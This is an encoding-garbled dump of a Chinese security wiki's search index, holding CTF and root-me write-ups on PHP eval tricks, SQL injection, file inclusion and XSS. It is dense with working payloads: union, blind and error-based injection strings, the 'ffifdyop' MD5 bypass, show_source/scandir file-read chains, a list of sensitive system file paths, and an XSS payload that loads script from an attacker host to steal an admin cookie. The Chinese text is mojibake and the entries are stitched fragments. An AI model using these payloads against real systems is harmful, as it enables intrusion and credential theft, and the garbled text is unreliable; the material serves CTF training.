åœ¨å€’æ•°ç¬¬äºŒä¸ªä¸ªä½ç½®é‚£å°±æ•°ç»„å€’ç½®array_revers()ï¼Œå˜ä¸ºæ­£æ•°ç¬¬äºŒï¼Œåœ¨ä½¿ç”¨next()å‡½æ•°æŒ‡å‘ä»ç¬¬ä¸€ä¸ªæŒ‡å‘ç¬¬äºŒä¸ªï¼ˆåŠæŒ‡å‘flag.phpï¼‰,æœ€åä½¿ç”¨show_sourceï¼ˆï¼‰æŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹ ?c=print_r(show_source(next(array_reverse(scandir(getcwd())))));url+?c=print_r(getcwd()); === /var/www/htmlurl+?c=print_r(scandir(getcwd())); === Array ( [0] = . [1] = .. [2] = flag.php [3] = index.php )url+?c=print_r(array_reverse(scandir(getcwd()))); == Array ( [0] = index.php [1] = flag.php [2] = .. [3] = . )url+?c=print_r(next(array_reverse(scandir(getcwd())))); == flag.phpurl+?c=print_r(show_source(next(array_reverse(scandir(getcwd()))))); == $flag=ctfshoweca2e7df-d196-4b71-9632-ad4d32e194d3; è¯»å–ç›®å½•getallheaders()ï¼šè¿”å›æ‰€æœ‰çš„HTTPå¤´ä¿¡æ¯ï¼Œè¿”å›çš„æ˜¯æ•°ç»„â½½evalè¦æ±‚ä¸ºå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¦â½¤implode()å‡½æ•°å°†æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸²get_defined_vars()ï¼šè¯¥å‡½æ•°çš„ä½œâ½¤æ˜¯è·å–æ‰€æœ‰çš„å·²å®šä¹‰å˜é‡ï¼Œè¿”å›å€¼ä¹Ÿæ˜¯æ•°ç»„ï¼Œä¸è¿‡æ˜¯â¼†ç»´æ•°ç»„ï¼Œâ½¤var_dump()è¾“å‡ºå¯ä»¥çœ‹â»…è¾“å‡ºçš„å†…å®¹ï¼Œçœ‹â»…åœ¨ç¬¬â¼ä½ä¹‹åï¼Œå¯ä»¥â½¤current()å‡½æ•°æ¥è·å–å…¶å€¼ï¼Œè¯¦ç»†å¯ä»¥çœ‹å®˜â½…å‡½æ•°ã€‚payloadï¼švar_dump(current(get_defined_vars()));session_id()ï¼šsession_id()å¯ä»¥â½¤æ¥è·å–/è®¾ç½®å½“å‰ä¼šè¯ IDï¼Œå¯ä»¥â½¤è¿™ä¸ªå‡½æ•°æ¥è·å–cookieä¸­çš„phpsessionidï¼Œå¹¶ä¸”è¿™ä¸ªå€¼æˆ‘ä»¬æ˜¯å¯æ§çš„ã€‚ å¦‚å¯ä»¥åœ¨cookieä¸­è®¾ç½® PHPSESSID=706870696e666f28293bï¼Œç„¶åâ½¤hex2bin()å‡½æ•°ï¼Œå³ä¼ â¼Š?exp=eval(hex2bin(session_id(session_start()))); å¹¶è®¾ç½®cookieï¼šPHPSESSID=706870696e666f28293b session_start å‡½æ•°æ˜¯ä¸ºäº†å¼€å¯sessioné…åˆä½¿â½¤çš„å‡½æ•°ï¼šprint_r(scandir(â€˜.â€™)); æŸ¥çœ‹å½“å‰â½¬å½•ä¸‹çš„æ‰€æœ‰â½‚ä»¶å var_dump()localeconv() å‡½æ•°è¿”å›â¼€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚current() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼ˆå•å…ƒï¼‰,é»˜è®¤å–ç¬¬â¼€ä¸ªå€¼ï¼Œposæ˜¯currentçš„åˆ«åeach() è¿”å›æ•°ç»„ä¸­å½“å‰çš„é”®/å€¼å¯¹å¹¶å°†æ•°ç»„æŒ‡é’ˆå‘å‰ç§»åŠ¨â¼€æ­¥end() å°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æœ€åâ¼€ä¸ªå•å…ƒnext() å°†æ•°ç»„ä¸­çš„å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨â¼€ä½prev() å°†æ•°ç»„ä¸­çš„å†…éƒ¨æŒ‡é’ˆå€’å›â¼€ä½array_reverse() ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„"},{"title":"SQLiæµç¨‹","path":"/wiki/WebçŸ¥è¯†ç‚¹/SQLæ³¨å…¥/SQLiæµç¨‹.html","content":"ä¸€ã€æ€è·¯1ã€åˆ¤æ–­æ³¨å…¥ç‚¹åœ¨GETå‚æ•°ã€POSTå‚æ•°ã€ä»¥åŠHTTPå¤´éƒ¨ç­‰ï¼ŒåŒ…æ‹¬Cookieã€Refererã€XFF(X-Forwarded-for)ã€UAç­‰åœ°æ–¹å°è¯•æ’å…¥ä»£ç ã€ç¬¦å·æˆ–è¯­å¥ï¼Œå°è¯•æ˜¯å¦å­˜åœ¨æ•°æ®åº“å‚æ•°è¯»å–è¡Œä¸ºï¼Œä»¥åŠèƒ½å¦å¯¹å…¶å‚æ•°äº§ç”Ÿå½±å“ï¼Œå¦‚äº§ç”Ÿå½±å“åˆ™è¯´æ˜å­˜åœ¨æ³¨å…¥ç‚¹ã€‚ 1ï¼‰ã€GET æ³¨å…¥æäº¤æ•°æ®çš„æ–¹å¼æ˜¯ GETï¼Œæ³¨å…¥ç‚¹çš„ä½ç½®åœ¨ GET å‚æ•°éƒ¨åˆ†ã€‚ä¾‹å¦‚æœ‰è¿™æ ·çš„ä¸€ä¸ªURLï¼šhttp://xxx.com/news.php?id=1ï¼Œidæ˜¯æ³¨å…¥ç‚¹ã€‚ 2ï¼‰ã€POST æ³¨å…¥ä½¿ç”¨ POST æ–¹å¼æäº¤æ•°æ®ï¼Œæ³¨å…¥ç‚¹ä½ç½®åœ¨ POST æ•°æ®éƒ¨åˆ†ï¼Œé€šå¸¸å‘ç”Ÿåœ¨è¡¨å•ä¸­ã€‚ 3ï¼‰ã€HTTP å¤´éƒ¨æ³¨å…¥æ³¨å…¥ç‚¹åœ¨ HTTP è¯·æ±‚å¤´éƒ¨çš„æŸä¸ªå­—æ®µä¸­ã€‚æ¯”å¦‚å­˜åœ¨ User-Agent å­—æ®µä¸­ï¼ŒCookie å­—æ®µä¸­ç­‰ã€‚ 2ã€åˆ¤æ–­æ•°æ®åº“ç±»å‹åˆ¤æ–­ç½‘ç«™ä½¿ç”¨çš„æ˜¯å“ªä¸ªæ•°æ®åº“ï¼Œå¸¸è§æ•°æ®åº“å¦‚ï¼šMySQLã€MSSQL(SQLserver)ã€Oracleã€Accessã€PostgreSQLã€BD2ç­‰ç­‰ã€‚ nmap ç«¯å£æ‰«æ æ•°æ®åº“ç±»å‹ é»˜è®¤ç«¯å£å· Oracle 1521 SQL Server 1433 MySQL 3306 PostgreSql 5432 ç½‘ç«™ç±»å‹ æ•°æ®åº“ç±»å‹ asp SQL Serverï¼ŒAccess .net SQL Server php Mysqlï¼ŒPostgreSql java Oracleï¼ŒMysql æ•°æ®åº“ç±»å‹ ç‰¹æœ‰çš„ç³»ç»Ÿè¡¨ Oracle SYS.USER_TABLES SQL Server SYSOBJECTS MySQL(MySQLç‰ˆæœ¬åœ¨5.0ä»¥ä¸Š) INFORMATION_SCHEMA.TABLES Access MSYSOBJECTS 2ã€æœ‰å›æ˜¾ æŠ¥é”™æŸ¥è¯¢ exp: andor exp(~(select * from (select user () ) a) ); updatexml: andor(updatexml(1,concat(0x7e,(select database()),0x7e),1)) extractvalue: extractvalue(1,concat(0x7e,version(),0x7e)) è”åˆæŸ¥è¯¢ ç¡®å®šåˆ—æ•°ï¼šunion select 1,2,3# ç¡®å®šå›æ˜¾åˆ—ï¼šæ¯”å¦‚æŸ¥å‡ºæ¥ 1ï¼Œ2 é‚£å°±åœ¨1ï¼Œ2ä¸Šè¿›è¡ŒæŸ¥è¯¢ ç¡®å®šæ•°æ®åº“ï¼šunion select database() ,2,3# ç¡®å®šè¡¨ï¼šunion select (select group_concat(table_name)) ,2,3 from information_schema.tables where table_schemadatabase()# ç¡®å®šåˆ—ï¼šunion select (group_concat(column_name)),2,3 from information_schema.columns where table_nameâ€™ â€˜# ç¡®å®šç”¨æˆ·ï¼šunion select 1,group_concat(user),3 from â€˜ â€˜# information_schema.schemata #information_schemaä¸‹é¢çš„æ‰€æœ‰æ•°æ®åº“å information_schema.tables #information_schemaä¸‹é¢çš„æ‰€æœ‰è¡¨å information_schema.columns #information_schemaä¸‹é¢æ‰€æœ‰çš„åˆ—å table_name #è¡¨å column_name #åˆ—å table_schema #æ•°æ®åº“å schema_name #æ•°æ®åº“åˆ—è¡¨å åŸºäºæŠ¥é”™boolç›²æ³¨and ascii(substr(database(),1,1))115 3ã€æ— å›æ˜¾ åŸºäºæ—¶é—´boolç›²æ³¨ æ•°æ®åº“ï¼šif(ascii(substr(database(),1,1))114,1,sleep(5))# è¡¨if(ascii(substr(select group_concat(table_name) from information_schema.tables where table_schemadatabase() LIMIT 0,1),1,1))114,1,sleep(5))#LIMIT 0,1 â†’ è·å–ç¬¬ä¸€å¼ è¡¨ï¼ˆå¦‚ â€˜usersâ€™ï¼‰ LIMIT 1,1 â†’ è·å–ç¬¬äºŒå¼ è¡¨ï¼ˆå¦‚ â€˜productsâ€™ï¼‰ 4ã€å…¶ä»– å®½å­—èŠ‚ï¼šâ€™è¢«è½¬ä¹‰ä¸º %dfâ€™ å †å ï¼šid1â€™; insert into users values(â€˜adminâ€™,â€™passwordâ€™)#"},{"title":"è·å–ç›®å½•","path":"/wiki/WP/REC/è·å–ç›®å½•.html","content":"å‡½æ•°"},{"title":"XSS - Reflected(åå°„å‹)","path":"/wiki/WP/root-me/XSS - Reflected(åå°„å‹).html","content":"ç›´æ¥çœ‹çœ‹æœ‰æ²¡æœ‰æ³¨å…¥ç‚¹ å‘ç°æœ‰ä¸ª?ppricesï¼Œå°è¯•æœ‰æ²¡æœ‰æ³¨å…¥ç‚¹ æŠ¥404ï¼Œæ£€æŸ¥ä¸€æ³¢ï¼Œ å‘ç°åœ¨é“¾æ¥å†…ï¼Œå¯ä»¥æ„é€ ä¸€ä¸‹ ç»“æœæ²¡ååº”ï¼Œåº”è¯¥æ˜¯è¢«è¿‡æ»¤æ‰äº† å‘ç°onmousemove å’Œâ€™ å¯ä»¥ç”¨ ä½†é¢˜ç›®è¦æ±‚æ˜¯admin ä¸ä¼šç‚¹å‡»æ‰€æœ‰å¯ç–‘çš„ XSS é“¾æ¥ ï¼Œå°è¯•æœ¬åœ°æ„é€ éšå½¢åŒ–xss,å‘æœåŠ¡å™¨å‘é€cookieï¼Œ æœåŠ¡å™¨åˆ©ç”¨è“è²èŠ±xsså¹³å°æ„å»ºhttps://github.com/firesunCN/BlueLotus_XSSReceiver ç”Ÿæˆæœ¬åœ°js,æ„å»ºpayload å‘ç°è¢«è¿‡æ»¤æ‰äº†,æ¢ç§æ–¹å¼ ?pexp%27%20onmouseover%27(function(){var%20sdocument.createElement(%22script%22);s.src%22http://your-ip/myjs/test.js%22;document.head.appendChild(s)})()%27 ç»™ç®¡ç†å‘˜æäº¤ä½ çš„æŠ¥å‘Šï¼Œç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œå°±ä¼šè¿”å›å†…å®¹ï¼Œä»–ä¼šå‘é€å¾ˆå¤šæ¬¡ï¼Œæœ‰æ—¶å€™æ²¡å‘è¿‡æ¥ï¼Œå¾—å¤šæ‰¾ä¸€ä¸‹"},{"title":"è¯»å–æ–‡ä»¶","path":"/wiki/WP/REC/è¯»å–æ–‡ä»¶.html","content":"å‡½æ•°highlight_file($filename);show_source($filename);require($filename)print_r(php_strip_whitespace($filename));print_r(file_get_contents($filename));readfile($filename);print_r(file($filename)); // var_dumpfread(fopen($filename,r), $size);include($filename); // â¾®phpä»£ç include_once($filename); // â¾®phpä»£ç require($filename); // â¾®phpä»£ç require_once($filename); // â¾®phpä»£ç print_r(fread(popen(cat flag, r), $size));print_r(fgets(fopen($filename, r))); // è¯»å–â¼€â¾fpassthru(fopen($filename, r)); // ä»å½“å‰ä½ç½®â¼€ç›´è¯»å–åˆ° EOFprint_r(fgetcsv(fopen($filename,r), $size));print_r(fgetss(fopen($filename, r))); // ä»â½‚ä»¶æŒ‡é’ˆä¸­è¯»å–â¼€â¾å¹¶è¿‡æ»¤æ‰ HTML æ ‡è®°print_r(fscanf(fopen(flag, r),%s));print_r(parse_ini_file($filename)); // å¤±è´¥æ—¶è¿”å› false , æˆåŠŸè¿”å›é…ç½®æ•°ç»„print_r(glob(*)); // åˆ—å½“å‰â½¬å½•print_r(glob(/*)); // åˆ—æ ¹â½¬å½•print_r(scandir(.));print_r(scandir(/));$d=opendir(.);while(false!==($f=readdir($d)))echo$f ;$d=dir(.);while(false!==($f=$d-read()))echo$f. ;$a=glob(/*);foreach($a as $value)echo $value. ;$a=new DirectoryIterator(glob:///*);foreach($a as $f)echo($f-__toString(). );"},{"title":"XSS--Server Side(æœåŠ¡ç«¯)","path":"/wiki/WP/root-me/XSS--Server Side(æœåŠ¡ç«¯).html","content":"https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Sideè¿›é¡µé¢ä¹‹åï¼Œå‘ç°å¯ä»¥ç”Ÿæˆä¿¡æ¯ï¼Œé¡µé¢å¾ˆç†Ÿæ‚‰ï¼Œæƒ³åˆ°å¯ä»¥è¯•è¯•å­˜å‚¨å‹sxx å‘ç°ï¼Œæ— è®ºè¾“å…¥ä»€ä¹ˆï¼Œéƒ½ä¼šè¿”å› çœ‹åˆ°ä¸€ä¸ªæ³¨å†Œé¡µé¢ï¼Œè¯•è¯•ï¼Œæ³¨å†Œé¡µé¢æœ‰æ²¡æœ‰æ³¨å…¥ç‚¹ æ³¨å†Œä¹‹åï¼Œç™»å½•ï¼Œçœ‹æœ‰æ²¡æœ‰ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šçš„(åå°„å‹xssç‰¹ç‚¹ï¼Œæ‰¾é¡µé¢å›æ˜¾çš„)ï¼Œ è¯´æ˜first name å’Œlast name ä¼šå›æ˜¾ ç”Ÿæˆè¯ä¹¦ è¯´æ˜å¯ä»¥ä»first name å’Œlast nameå…¥æ‰‹æ„é€ xss ç„¶åæ„é€ payload scriptdocument.write(iframe src=file:///flag.txt/iframe);/script è·å–flag"},{"title":"Windowsææƒ","path":"/wiki/WP/Windowsææƒ/index.html","content":"vulnhub æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½•"},{"title":"æ–‡ä»¶åŒ…å«","path":"/wiki/WebçŸ¥è¯†ç‚¹/æ–‡ä»¶åŒ…å«/æ–‡ä»¶åŒ…å«.html","content":"æ–‡ä»¶åŒ…å« å‡½æ•°include conn.php: å½“åŒ…å«æ–‡ä»¶å‡ºç°é”™è¯¯æ—¶ï¼Œå‘å‡ºé”™è¯¯ä¿¡æ¯ï¼Œç»§ç»­æ‰§è¡Œ include_once conn.phpï¼šåªåŒ…å«ä¸€æ¬¡ require conn.phpï¼š å½“åŒ…å«å‡ºç°é”™è¯¯æ—¶ï¼Œå‘å‡ºé”™è¯¯ä¿¡æ¯ï¼Œä¸å†æ‰§è¡Œ require_once conn.phpï¼šåªåŒ…å«ä¸€æ¬¡ æœ¬åœ°åŒ…å«æœ¬åœ°æ–‡ä»¶åŒ…å«å°±æ˜¯é€šè¿‡æµè§ˆå™¨åŒ…å«webæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œè¿™ç§æ¼æ´æ˜¯å› ä¸ºæµè§ˆå™¨åŒ…å«æ–‡ä»¶æ—¶æ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤å…è®¸éå†ç›®å½•çš„å­—ç¬¦æ³¨å…¥æµè§ˆå™¨å¹¶æ‰§è¡Œã€‚æ–‡ä»¶åŒ…å«æ¼æ´è¿˜åŒ…å«å½“å‰æœåŠ¡å™¨ä¸­çš„å…¶ä»–æ–‡ä»¶ï¼ŒåŒæ—¶æ”¯æŒåŒ…å«Webåº”ç”¨ç¨‹åºçš„ç›®å½•ï¼Œå°è¯•åŒ…æ‹¬ä½ çš„ç¡¬ç›˜çš„ä¸€äº›å†…å®¹ï¼Œä¾‹å¦‚ï¼šC:\\WINDOWS\\system.iniã€‚ phpä¼ªåè®®php://php://input+postæ•°æ®php://filter/read=convert.base64-encode/resource=index.phpdata://text/plain,?php%20phpinfo();? è¿œç¨‹åŒ…å«.allow_url_fopen On allow_url_include On å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šåˆ¶ä½œä»¥æ¶ææ¶æ„æ–‡ä»¶ï¼Œé€šè¿‡httpæˆ–httpsè¿›è¡Œä¸Šä¼ ï¼Œå³å¯è¾¾åˆ°è¿œç¨‹æ§åˆ¶ å¸¸è§çš„æ•æ„Ÿä¿¡æ¯è·¯å¾„ï¼šWindowsç³»ç»Ÿ c:\\boot.ini æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ c:\\windows\\system32\\inetsrv\\MetaBase.xml IISé…ç½®æ–‡ä»¶ c:\\windows\\repair\\sam å­˜å‚¨Windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç  c:\\ProgramFiles\\mysql\\my.ini MySQLé…ç½® c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD MySQL rootå¯†ç  c:\\windows\\php.ini php é…ç½®ä¿¡æ¯ LinuxUnixç³»ç»Ÿ etcpasswd è´¦æˆ·ä¿¡æ¯ etcshadow è´¦æˆ·å¯†ç æ–‡ä»¶ usrlocalappapache2confhttpd.conf Apache2é»˜è®¤é…ç½®æ–‡ä»¶ usrlocalappapache2confextrahttpd-vhost.conf è™šæ‹Ÿç½‘ç«™é…ç½® usrlocalappphp5libphp.ini PHPç›¸å…³é…ç½® etchttpdconfhttpd.conf Apacheé…ç½®æ–‡ä»¶ etcmy.conf mysql é…ç½®æ–‡ä»¶"},{"title":"XSS--ServerSide(æœåŠ¡ç«¯)","path":"/wiki/WP/root-me/XSS--ServerSide(æœåŠ¡ç«¯).html","content":"XSSâ€“Server Side(æœåŠ¡ç«¯)https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Sideè¿›é¡µé¢ä¹‹åï¼Œå‘ç°å¯ä»¥ç”Ÿæˆä¿¡æ¯ï¼Œé¡µé¢å¾ˆç†Ÿæ‚‰ï¼Œæƒ³åˆ°å¯ä»¥è¯•è¯•å­˜å‚¨å‹sxx å‘ç°ï¼Œæ— è®ºè¾“å…¥ä»€ä¹ˆï¼Œéƒ½ä¼šè¿”å› çœ‹åˆ°ä¸€ä¸ªæ³¨å†Œé¡µé¢ï¼Œè¯•è¯•ï¼Œæ³¨å†Œé¡µé¢æœ‰æ²¡æœ‰æ³¨å…¥ç‚¹ æ³¨å†Œä¹‹åï¼Œç™»å½•ï¼Œçœ‹æœ‰æ²¡æœ‰ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šçš„(åå°„å‹xssç‰¹ç‚¹ï¼Œæ‰¾é¡µé¢å›æ˜¾çš„)ï¼Œ è¯´æ˜first name å’Œlast name ä¼šå›æ˜¾ ç”Ÿæˆè¯ä¹¦ è¯´æ˜å¯ä»¥ä»first name å’Œlast nameå…¥æ‰‹æ„é€ xss ç„¶åæ„é€ payload scriptdocument.write(iframe src=file:///flag.txt/iframe);/script è·å–flag æ›´æ–°: 2025-10-23 17:45:18åŸæ–‡: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/yp85ok2h21pe2mcv"},{"title":"root-me","path":"/wiki/WP/root-me/index.html","content":"XSS - Reflected(åå°„å‹) ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ XSS--Server Side(æœåŠ¡ç«¯) ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ XSS--ServerSide(æœåŠ¡ç«¯) ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ XSS-Reflected(åå°„å‹) ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"XSS-Reflected(åå°„å‹)","path":"/wiki/WP/root-me/XSS-Reflected(åå°„å‹).html","content":"XSS - Reflected(åå°„å‹)ç›´æ¥çœ‹çœ‹æœ‰æ²¡æœ‰æ³¨å…¥ç‚¹ å‘ç°æœ‰ä¸ª?ppricesï¼Œå°è¯•æœ‰æ²¡æœ‰æ³¨å…¥ç‚¹ æŠ¥404ï¼Œæ£€æŸ¥ä¸€æ³¢ï¼Œ å‘ç°åœ¨é“¾æ¥å†…ï¼Œå¯ä»¥æ„é€ ä¸€ä¸‹ ç»“æœæ²¡ååº”ï¼Œåº”è¯¥æ˜¯è¢«è¿‡æ»¤æ‰äº† å‘ç°onmousemove å’Œâ€™ å¯ä»¥ç”¨ ä½†é¢˜ç›®è¦æ±‚æ˜¯admin ä¸ä¼šç‚¹å‡»æ‰€æœ‰å¯ç–‘çš„ XSS é“¾æ¥ ï¼Œå°è¯•æœ¬åœ°æ„é€ éšå½¢åŒ–xss,å‘æœåŠ¡å™¨å‘é€cookieï¼Œ æœåŠ¡å™¨åˆ©ç”¨è“è²èŠ±xsså¹³å°æ„å»ºhttps://github.com/firesunCN/BlueLotus_XSSReceiver ç”Ÿæˆæœ¬åœ°js,æ„å»ºpayload å‘ç°è¢«è¿‡æ»¤æ‰äº†,æ¢ç§æ–¹å¼ ?pexp%27%20onmouseover%27(function(){var%20sdocument.createElement(%22script%22);s.src%22http://your-ip/myjs/test.js%22;document.head.appendChild(s)})()%27 ç»™ç®¡ç†å‘˜æäº¤ä½ çš„æŠ¥å‘Šï¼Œç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œå°±ä¼šè¿”å›å†…å®¹ï¼Œä»–ä¼šå‘é€å¾ˆå¤šæ¬¡ï¼Œæœ‰æ—¶å€™æ²¡å‘è¿‡æ¥ï¼Œå¾—å¤šæ‰¾ä¸€ä¸‹ æ›´æ–°: 2025-10-23 18:14:58åŸæ–‡: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/pu4zpg9kl5475fa5"},{"title":"æ‚é¡¹çŸ¥è¯†ç‚¹","path":"/wiki/WP/sqlæ³¨å…¥/æ‚é¡¹çŸ¥è¯†ç‚¹.html","content":"åˆ†ç±»1. MD5æ³¨å…¥ md5($password,true) md5(string,raw) å‚æ•° æè¿°string\tå¿…éœ€ã€‚è¦è®¡ç®—çš„å­—ç¬¦ä¸²ã€‚ raw å¯é€‰ã€‚é»˜è®¤ä¸å†™ä¸ºFALSEã€‚32ä½16è¿›åˆ¶çš„å­—ç¬¦ä¸²TRUEã€‚16ä½åŸå§‹äºŒè¿›åˆ¶æ ¼å¼çš„å­—ç¬¦ä¸² ffifdyopå­—ç¬¦ä¸²ä¼šé€ æˆæ¼æ´ã€‚md5(ffifdyop,true)=â€™orâ€™6xxxxxxå› æ­¤ä¼ å…¥ffifdyopä¹‹åï¼Œæ•°æ®åº“æŸ¥è¯¢è¯­å¥å˜ä¸ºï¼šselect * from â€˜adminâ€™ where password= or â€™6xxxxxx â€™ ï¼Œå˜æˆ â€˜â€™ or 6 MD5è¿”å›çš„16è¿›åˆ¶æ•°æ—¶ å‡ºç°ä¸ç¬¦åˆæ ‡å‡†æ ¼å¼çš„åå…­è¿›åˆ¶æ•°ã€ä¸ç¬¦åˆé¢„æœŸçš„é•¿åº¦ã€åŒ…å«ç‰¹æ®Šæƒ…å†µæˆ–é”™è¯¯ç­‰æƒ…å†µä¸‹ï¼Œä¼šè¿”å›äºŒè¿›åˆ¶æ•°ï¼Œç»æµè§ˆå™¨ç¼–ç æƒ…å†µä¸‹ï¼Œä¼šå˜æˆå¥‡æ€ªçš„å­—ç¬¦ï¼Œç»è¿‡ä¸æ–­å°è¯•åï¼Œå‘ç°æŸäº›ç‰¹å®šå­—ç¬¦è¢«mysqlè§£ææˆä¸‡èƒ½å¯†ç çš„æ ¼å¼ã€å¦‚129581926211651571912466741651878684928ã€ffifdyopï¼Œä½†è¿™é‡Œä¸èƒ½ç”¨æ•°å­—å‹ï¼Œå› ä¸ºé™åˆ¶å¯†ç é•¿åº¦äº†åœ¨mysqlé‡Œé¢ï¼Œåœ¨ç”¨ä½œå¸ƒå°”å‹åˆ¤æ–­æ—¶ï¼Œä»¥1å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å‹æ•°ã€‚è¦æ³¨æ„çš„æ˜¯è¿™ç§æƒ…å†µæ˜¯å¿…é¡»è¦æœ‰å•å¼•å·æ‹¬èµ·æ¥çš„ï¼Œæ¯”å¦‚password=â€˜xxxâ€™ or â€˜1xxxxxxxxxâ€™ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or 1 ï¼Œä¹Ÿå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or trueï¼Œæ‰€ä»¥è¿”å›å€¼å°±æ˜¯trueã€‚å½“ç„¶åœ¨æˆ‘åæ¥æµ‹è¯•ä¸­å‘ç°ï¼Œä¸åªæ˜¯1å¼€å¤´ï¼Œåªè¦æ˜¯æ•°å­—å¼€å¤´éƒ½æ˜¯å¯ä»¥çš„ã€‚ 2.with rollupusername=admin//or//1=1//group//by//password//with/**/rollup#password= åŠ å…¥with rollupå passwordæœ‰ä¸€è¡Œä¸ºNULLï¼Œæˆ‘ä»¬åªè¦è¾“å…¥ç©ºå¯†ç ä½¿å¾—ï¼ˆNULL==NULLï¼‰å³å¯æ»¡è¶³$password==$row[password]çš„é™åˆ¶æˆåŠŸç™»é™†with rollup æ˜¯å¯¹åˆ†ç»„åçš„ç»“æœè¿›è¡Œèšåˆæ±‚å’Œï¼Œåœ¨æœ€åä¸€è¡Œç”Ÿæˆæ±‚å’Œçš„æ•°æ®ã€‚ä½†æ˜¯å¦‚æœå½“å‰åˆ—æ˜¯å­—ç¬¦ä¸²æ— æ³•æ±‚å’Œçš„è¯ï¼Œæ±‚å’Œç»“æœå°±ä¼šå˜æˆNULL 3.è¿‡æ»¤äº† information_schema.tables å’Œinformation_schema.columnsæ–¹æ³•ä¸€ï¼šåå¼•å·ç»•è¿‡ information_schema.`tables` å’Œ information_schema.`columns` æ–¹æ³•äºŒï¼šæ‰¾å¹³æ›¿è¡¨+æ— åˆ—åæŸ¥è¯¢ æ¯”å¦‚ysql.innodb_table_stats (ç”±äºmysqlç‰ˆæœ¬ä¸åŒï¼Œå¯åˆ©ç”¨çš„è¡¨ä¹Ÿä¸ä¸€æ ·) select * from users as a join users as b; ä¼šå‡ºç°aè¡¨å’Œbè¡¨æ‹¼æ¥æˆä¸€ä¸ªæ–°è¡¨ å†å¯¹å…¶ä½¿ç”¨ä¸€ä¸ªselectæŸ¥è¯¢è¿›è¡ŒåŒ…è£¹ï¼Œç”±äºä¼šå‡ºç°å¤šä¸ªç›¸åŒçš„åˆ—åï¼Œé‚£ä¹ˆä»–å°±ä¼šæŠ¥é”™ã€‚å°±å¯ä»¥åˆ©ç”¨æ­¤ç‰¹æ€§è¿›è¡Œsqlæ³¨å…¥æŸ¥è¯¢åˆ—åã€‚ select * from (select * from users as a join users as b) as c; å½“æŸ¥è¯¢å®Œç¬¬ä¸€ä¸ªåˆ—åæ—¶ï¼Œä½¿ç”¨usingæ’é™¤ï¼Œç»§ç»­æŸ¥è¯¢ä¸‹ä¸€ä¸ªåˆ—åã€‚ select * from (select * from users as a join users as b using(id)) as c;å®æ“ï¼š ?id=0 union select * from (select * from users as a join users as b) as c --+ ï¼ˆä¼šæ˜¾ç¤ºå‡ºidï¼‰ ?id=0 union select * from (select * from users as a join users as b using(id)) as c --+ ï¼ˆä¼šæ˜¾ç¤ºå‡ºusernameï¼‰ ?id=0 union select * from (select * from users as a join users as b using(idï¼Œusername)) as c --+(ä¼šæ˜¾ç¤ºå‡ºç¬¬ä¸‰åˆ—ï¼Œä»¥æ­¤ç±»æ¨)"},{"title":"sqlæ³¨å…¥","path":"/wiki/WP/sqlæ³¨å…¥/index.html","content":"æ‚é¡¹çŸ¥è¯†ç‚¹ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ ç»•è¿‡select,å †å  ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"ç»•è¿‡select,å †å ","path":"/wiki/WP/sqlæ³¨å…¥/ç»•è¿‡select,å †å .html","content":"2019å¼ºç½‘æ¯â€éšä¾¿æ³¨â€ä¸€çœ‹å°±æ˜¯sqlæ³¨å…¥é¦–å…ˆåˆ¤æ–­æ˜¯æ•°å­—è¿˜æ˜¯å­—ç¬¦æ³¨å…¥ï¼Œ è¾“å…¥ 1 ï¼Œ2ï¼Œååº”æ­£å¸¸ï¼Œ è¾“å…¥2-1 ï¼Œç»“æœå›æ˜¾2 çš„å†…å®¹ï¼Œæ’é™¤æ•°å­—æ³¨å…¥ è¾“å…¥1â€™ æŠ¥é”™ï¼Œé‚£å°±æ˜¯ select * from database Â·Â·Â·Â·Â·idâ€™1â€™; ç„¶åå°±æ˜¯çœ‹åˆ—æ•°ï¼› 1â€™ order by 2 â€“+ å›æ˜¾æ­£å¸¸ï¼Œ order by 3â€“+å¼‚å¸¸ï¼Œé‚£å°±æ˜¯ä¸¤åˆ— ç„¶åæ­£å¸¸çš„æ³¨å…¥ 1â€™ union select 1,2 â€“+,å‘ç° preg_match(â€œselect|update|delete|drop|insert|where|.i select ç­‰è¢«ban äº†é€šè¿‡æŠ¥é”™æ¥æŸ¥çœ‹æ•°æ®åº“ï¼Œç­‰ä¿¡æ¯ 2â€™ and extractvalue(1,concat(0x7e,(version()),0x7e))â€“+ 